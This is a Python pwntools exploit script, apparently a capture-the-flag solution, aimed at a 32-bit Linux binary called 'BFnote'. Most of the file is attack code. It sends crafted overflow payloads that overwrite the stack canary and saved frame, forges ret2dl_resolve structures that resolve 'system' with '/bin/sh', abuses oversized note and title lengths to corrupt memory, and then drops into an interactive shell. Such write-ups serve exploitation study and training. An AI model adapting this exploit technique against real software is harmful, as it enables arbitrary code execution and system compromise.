from pwn import *
context(os='linux', arch='i386', log_level='debug')
#[author]: b0ldfrev

p= process('./BFnote')

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        print "breakpoint_addr --> " + hex(text_base + 0x202040)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr))) 

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)


dl_resolve_data="\x80\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x37\x66\x66\x5a\x6d\x59\x50\x47\x60\xa1\x04\x08\x07\x25\x02\x00\x73\x79\x73\x74\x65\x6d\x00"
dl_resolve_call="\x50\x84\x04\x08\x70\x20\x00\x00"



canary=0xdeadbe00
postscript=0x804A060
#correct=0x804a428

payload1="1"*0x32+p32(canary)+p32(0)+p32(postscript+4+0x3a8)

ru("description : ")
sd(payload1)


payload2="s"*0x3a8+dl_resolve_call+p32(0x12345678)+p32(postscript+0x3b8)+"/bin/sh\x00"+p64(0)+dl_resolve_data

ru("postscript : ")
sd(payload2)


ru("notebook size : ")
sl(str(0x200000))

ru("title size : ")
sl(str(0x20170c-0x10))

ru("please re-enter :\n")
sl(str(100))

ru("your title : ")
sl("2222")

ru("your note : ")

sd(p32(canary))

p.interactive()
